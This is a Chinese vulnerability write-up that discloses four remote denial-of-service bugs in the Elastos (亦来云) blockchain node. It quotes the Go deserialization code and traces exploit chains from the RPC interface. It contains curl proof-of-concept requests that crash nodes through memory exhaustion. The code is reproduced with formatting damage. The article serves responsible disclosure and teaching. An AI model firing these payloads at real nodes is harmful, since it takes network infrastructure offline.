> 原文链接: https://www.anquanke.com//post/id/168711 


# 公链安全之亦来云多个远程DoS漏洞详解


                                阅读量   
                                **228044**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t0155de6e884c303403.jpg)](https://p5.ssl.qhimg.com/t0155de6e884c303403.jpg)



关于区块链安全的资料，目前互联网上主要侧重于钱包安全、智能合约安全、交易所安全等，而很少有关于公链安全的资料，公链是以上一切业务应用的基础，本文将介绍公链中比较常见的一种的DoS漏洞。

## 1、 知识储备

公链客户端与其他传统软件的客户端没有太大区别，在传统软件上会遇到的问题在公链客户端中都有可能遇到。

所以要让一个客户端发生Crash的常见方法有：
1. 使程序发生运行时异常，且这个异常没有被容错，例如数组越界、除以0、内存溢出等。
1. 使系统环境不满足程序运行的要求，例如创建大数组造成的OOM、无限递归造成的OOM等
1. 多线程死锁
1. 其他
公链节点可被轻易攻击下线的危害是巨大的，比如会使网络算力骤减，从而导致51%攻击等。

本文根据亦来云的这几个漏洞主要介绍的是由OOM所引起的Crash漏洞。



## 2、 漏洞分析

本文主要对亦来云公链0.2.0的以下价值20ETH的4个漏洞进行分析：

DVP-2018-08809（Reward：5ETH）

DVP-2018-08813（Reward：5ETH）

DVP-2018-08817（Reward：5ETH）

DVP-2018-10793（Reward：5ETH）

### DVP-2018-08809

servers/interfaces.go漏洞代码片段：

```
func StartRPCServer() `{`
    mainMux = make(map[string] func(Params) map[string] interface `{``}`)  http.HandleFunc("/", Handle)   //省略一段    // mining interfaces    mainMux["togglemining"] = ToggleMining
    mainMux["discretemining"] = DiscreteMining  err: =http.ListenAndServe(":" + strconv.Itoa(Parameters.HttpJsonPort), nil) if err != nil `{`    log.Fatal("ListenAndServe: ", err.Error())  
    `}`
`}`
```

PoC：

```
curl--data - binary '`{`"method":"discretemining","params":`{`"count":"99999999999999"`}``}`' - H 'Content-Type:application/json'http: //*.*.*.*:20333
```

### DVP-2018-08813

core/payloadwithdrawfromsidechain.go漏洞代码片段：

```
func(t * PayloadWithdrawFromSideChain) Deserialize(r io.Reader, version byte) error `{`  height,
    err: =common.ReadUint32(r) if err != nil `{`
        return errors.New("[PayloadWithdrawFromSideChain], BlockHeight deserialize failed.")  
    `}`  address,
    err: =common.ReadVarString(r) if err != nil `{`
        return errors.New("[PayloadWithdrawFromSideChain], GenesisBlockAddress deserialize failed.")  
    `}`
    length,
    err: =common.ReadVarUint(r, 0)

    if err != nil `{`
        return errors.New("[PayloadWithdrawFromSideChain], SideChainTransactionHashes length deserialize failed")  
    `}`  t.SideChainTransactionHashes = nil  t.SideChainTransactionHashes = make([] common.Uint256, length) for i: =uint64(0);
    i &lt; length;
    i++`{`
        var hash common.Uint256    err: =hash.Deserialize(r) if err != nil `{`
            return errors.New("[WithdrawFromSideChain], SideChainTransactionHashes deserialize failed.")    
        `}`    t.SideChainTransactionHashes[i] = hash  
    `}`  t.BlockHeight = height  t.GenesisBlockAddress = address  
    return nil
`}`
```



这里同样是由于make函数的第二个参数由参数r控制，只要r可控就可以使make函数引发OOM，从而Crash。

在servers/interface.go中的SendRawTransaction函数中发现间接的调用了Transaction的Deserialize函数，具体如下：

```
func SendRawTransaction(param Params) map[string] interface `{``}` `{`
    str,
    ok: =param.String("data") if ! ok `{`
        return ResponsePack(InvalidParams, "need a string parameter named data")  
    `}`
    bys,
    err: =HexStringToBytes(str) if err != nil `{`
        return ResponsePack(InvalidParams, "hex string to bytes error")  
    `}`
    var txn Transaction err: =txn.Deserialize(bytes.NewReader(bys));
    err != nil `{`
        return ResponsePack(InvalidTransaction, "transaction deserialize error")  
    `}`
    if errCode: =VerifyAndSendTx( &amp; txn);
    errCode != Success `{`
        return ResponsePack(errCode, errCode.Message())  
    `}`
    return ResponsePack(Success, ToReversedString(txn.Hash()))
`}`
```

根据如上标红代码可以发现SendRawTransaction函数会先取RPC接口传来的data参数复制给变量str，然后变量str会转换为bytes复制给变量bys，最后bys变量会被带入Transaction的Deserialize函数中。

再看看Transaction的Deserialize函数：

```
func(tx * Transaction) Deserialize(r io.Reader) error `{`
    // tx deserialize
    if err: =tx.DeserializeUnsigned(r);
    err != nil `{`
        //略
        return nil
    `}`
    //略
```

参数r被带入了Transaction的DeserializeUnsigned函数中，继续跟踪一下：

```
func(tx * Transaction) DeserializeUnsigned(r io.Reader) error `{`
    //略
    tx.Payload,
    err = GetPayload(tx.TxType) if err != nil `{`
        return err  
    `}`  err = tx.Payload.Deserialize(r, tx.PayloadVersion)
    //略
    return nil
`}`
func GetPayload(txType TransactionType)(Payload, error) `{`
    var p Payload
    switch txType `{`
        //略
    case WithdrawFromSideChain:
        p = new(PayloadWithdrawFromSideChain)
    case TransferCrossChainAsset:
              p = new(PayloadTransferCrossChainAsset)
    default:
        return nil,
        errors.New("[Transaction], invalid transaction type.")  
    `}`
    return p,
    nil
`}`
```

在该函数中会先通过GetPayload(tx.TxType)来取到tx.Payload，然后会调用tx.Payload的Deserialize函数，只要能控制Payload的类型为PayloadWithdrawFromSideChain，就可以触发PayloadWithdrawFromSideChain的Deserialize函数，而Transaction是通过RPC接口远程传来的，所以tx对象的字段都是可控的。

最终的利用链：RPC的SendRawTransaction接口-&gt;Transaction的Deserialize函数-&gt;Transaction的DeserializeUnsigned函数-&gt;通过GetPayload取到取到PayloadWithdrawFromSideChain对象-&gt;调用其的Deserialize函数-&gt;触发make-&gt;OOM

PoC：

```
curl--data - binary '`{`"method":"sendrawtransaction","params":`{`"data":"0701100000000196ffffffffff"`}``}`' - H 'Content-Type:application/json'http: //*.*.*.*:20336
```

漏洞复现：

[![](https://mpt.135editor.com/mmbiz_gif/OGRRTF3bicTXd9q0sPUB1YMKPbxS1MEB6Wog39EcoKGNbtShHrpxItc6cmz0Akia00oDaU3y4shHjVWwjBjlXibTg/640?wx_fmt=gif)](https://mpt.135editor.com/mmbiz_gif/OGRRTF3bicTXd9q0sPUB1YMKPbxS1MEB6Wog39EcoKGNbtShHrpxItc6cmz0Akia00oDaU3y4shHjVWwjBjlXibTg/640?wx_fmt=gif)

### DVP-2018-08817

还是上面的Deserialize函数引起的OOM，不过触发点不同。

这次的触发点是在servers/interfaces.go中的SubmitAuxBlock函数中：

```
func SubmitAuxBlock(param Params) map[string] interface `{``}` `{`  blockHash,
    ok: =param.String("blockhash") if ! ok `{`
        return ResponsePack(InvalidParams, "parameter blockhash not found")  
    `}`
    var msgAuxBlock * Block
    if msgAuxBlock,
    ok = LocalPow.MsgBlock.BlockData[blockHash]; ! ok `{`    log.Trace("[json-rpc:SubmitAuxBlock] block hash unknown", blockHash) return ResponsePack(InternalError, "block hash unknown")  
    `}`  auxPow,
    ok: =param.String("auxpow") if ! ok `{`
        return ResponsePack(InvalidParams, "parameter auxpow not found")  
    `}`
    var aux aux.AuxPow  buf, _: =HexStringToBytes(auxPow) if err: =aux.Deserialize(bytes.NewReader(buf));
    err != nil `{`    log.Trace("[json-rpc:SubmitAuxBlock] auxpow deserialization failed", auxPow) return ResponsePack(InternalError, "auxpow deserialization failed")  
    `}`
    //略
    return ResponsePack(Success, true)
`}`
```

根据如上代码可以发现，RPC接口传过来的auxpow参数经过转为bytes后会传入变量buf，最终变量buf会被带入Deserialize函数中，所以整个过程也是可控的，唯一不足的是这个触发点还需要提供另外一个参数blockhash，如果不提供这个参数或者提供有误的话会没法往下执行，不过好在正好还有一个CreateAuxblock函数，利用此函数可以创建一个Auxblock并得到它的blockhash。

PoC：

```
curl--data - binary '`{`"method":"createauxblock","params":`{`"paytoaddress":"0701100000000196ffffffffff"`}``}`' - H 'Content-Type:application/json'http: //*.*.*.*:20336
curl--data - binary '`{`"method":"submitauxblock","params":`{`"blockhash":"上个请求返回的blockhash","auxpow":"ffffffffffffffffff"`}``}`' - H 'Content-Type:application/json'http: //*.*.*.*:20336
```

### DVP-2018-10793

最后这一个漏洞问题不是出在亦来云公链源码中，而是出在亦来云公链的官方依赖包(Elastos.ELA.Utility)中

common/serialize.go漏洞代码片段：

```
func ReadVarBytes(reader io.Reader)([] byte, error) `{`    val,
    err: =ReadVarUint(reader, 0) if err != nil `{`
        return nil,
        err    
    `}`    str,
    err: =byteXReader(reader, val) if err != nil `{`
        return nil,
        err      
    `}`
    return str,
    nil
`}`
```

```
func byteXReader(reader io.Reader, x uint64)([] byte, error) `{`    p: =make([] byte, x)    n,
    err: =reader.Read(p) if n &gt; 0 `{`
        return p[: ],
        nil
    `}`
    return p,
    err  
`}`
```

ReadVarBytes函数会从reader参数中取出一个数值给val变量，val变量会被带入byteXReader函数 中，而byteXReader函数会将接收到的第二个参数带入make函数的第二个参数中，所以只要reader可控的话就能构造一段payload最终使make函数引起OOM。

由于这个函数在一个通用工具库中，所以理论上可以从很多地方触发，这个漏洞还是使用的是RPC接口的SendRawTransaction函数的Deserialize函数进行触发。

```
func(tx * Transaction) Deserialize(r io.Reader) error `{`
    //略
    for i: =uint64(0);
    i &lt; count;
    i++`{`
        var program Program
        if err: =program.Deserialize(r);
        err != nil `{`
            return errors.New("transaction deserialize program error: " + err.Error())    
        `}`    tx.Programs = append(tx.Programs, &amp;program)  
    `}`
    return nil
`}`
```

然后调用到了Program的Deserialize函数：

```
func(p * Program) Deserialize(w io.Reader) error `{`  parameter,
    err: =ReadVarBytes(w) if err != nil `{`
        return errors.New("Execute Program Deserialize Parameter failed.")  
    `}`  p.Parameter = parameter code,
    err: =ReadVarBytes(w) if err != nil `{`
        return errors.New("Execute Program Deserialize Code failed.")  
    `}`  p.Code = code
    return nil
`}`
```

然后就调用到了依赖库中的ReadVarBytes函数，该函数会调用触发OOM的byteXReader函数，数据都是一路从RPC接口传过来的，所以是可控的。

那么利用链就很明了了：RPC的SendRawTransaction接口-&gt;Transaction的Deserialize函数-&gt;Program的Deserialize函数-&gt;依赖库中的ReadVarBytes函数-&gt;byteXReader函数-&gt;触发make-&gt;OOM

PoC：

```
curl--data - binary '`{`"method":"sendrawtransaction","params":`{`"data":"0301ffffffffff"`}``}`' - H 'Content-Type:application/json'http: //*.*.*.*:20336
```

漏洞复现：

[![](https://mpt.135editor.com/mmbiz_gif/OGRRTF3bicTXd9q0sPUB1YMKPbxS1MEB6TB0BDncGIxA36lOCiayd4uok5EChd287wXBibXniadle1VqngXI61WxXg/640?wx_fmt=gif)](https://mpt.135editor.com/mmbiz_gif/OGRRTF3bicTXd9q0sPUB1YMKPbxS1MEB6TB0BDncGIxA36lOCiayd4uok5EChd287wXBibXniadle1VqngXI61WxXg/640?wx_fmt=gif)



## 3、 总结

Crash漏洞其实在传统安全领域已经非常常见了，比如Fuzzing浏览器，在遇到某些特殊输入的时候浏览器就会发生Crash，不过仅仅是Crash的话在传统客户端领域，危害其实并不是很大。

但在区块链中便不同了，任何一个微小的问题都可以被无限放大，例如：整型溢出漏洞导致超额铸币。所以就Crash漏洞来说，在区块链的公链中也是属于高危类型的漏洞，因为公链节点既是客户端 也是服务端，属于整个公链生态的基础设施。

目前公链安全由于其门槛相对较高，所以研究的人也比较少，DVP基金会将秉着负责任的披露原则逐步公开行业内的经典漏洞案例，为区块链安全领域添砖加瓦，同时我们也希望更多的白帽子参与到区块链安全这个还处于蛮荒阶段的领域中来。
